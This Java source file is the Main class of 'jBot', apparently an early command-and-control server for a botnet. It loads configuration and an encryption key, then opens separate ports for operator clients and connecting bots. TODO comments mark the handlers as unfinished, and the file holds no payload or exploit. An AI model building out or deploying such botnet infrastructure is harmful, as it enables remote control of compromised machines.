package me.aaronakhtar.jbot;

import me.aaronakhtar.jbot.file_manager.ConfigFile;
import me.aaronakhtar.jbot.file_manager.files.DefaultConfigurationFile;
import me.aaronakhtar.jbot.threads.BotServer;
import me.aaronakhtar.jbot.threads.ClientServer;
import org.reflections.Reflections;

import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Set;

public class Main {

    public static final Map<String, Object> defaultConfig = ConfigFile.getProperties(new DefaultConfigurationFile());
    public static final List<Socket>        connectedBots = new ArrayList<>();
    public static final List<Socket>        connectedClients = new ArrayList<>();
    public static volatile boolean          isRunning = true;
    public static final String              name = "jBot";
    public static final String              encryptionKey = defaultConfig.get("encryption-key").toString();

    public static final Set<Class<? extends ConfigFile>> configFiles = new Reflections("me.aaronakhtar.jbot.file_manager.files")
            .getSubTypesOf(ConfigFile.class);



    public static void main(String[] args) {

        if (args.length != 2){
            Utilities.sendInternalMessage(Utilities.Colour.RED.get() + "Oops! " + Utilities.Colour.RESET.get() + "Please specify the required arguments...");
            System.out.println("'java -jar cnc.jar [cnc-port] [bot-port]'");
            return;
        }

        final int cncPort = Integer.parseInt(args[0]);
        final int botPort = Integer.parseInt(args[1]);
        for (Class<? extends ConfigFile> configFile : configFiles){
            try {
                configFile.newInstance().getFile(); // will create file if it doesn't exist.
            }catch (Exception e){
                Utilities.handleException(e);
            }
        }

        new ClientServer(cncPort).start();
        new BotServer(botPort).start();

        //TODO:
        //  create server
        //  create client handlers
        //  create bot handler
        //
        //  So much more as well, however these
        //  are the primary concerns at the moment.


    }

    public static String getPrefix(){
        return Utilities.Colour.GREEN.get() + "[jBot] " + Utilities.Colour.RESET.get();
    }

}
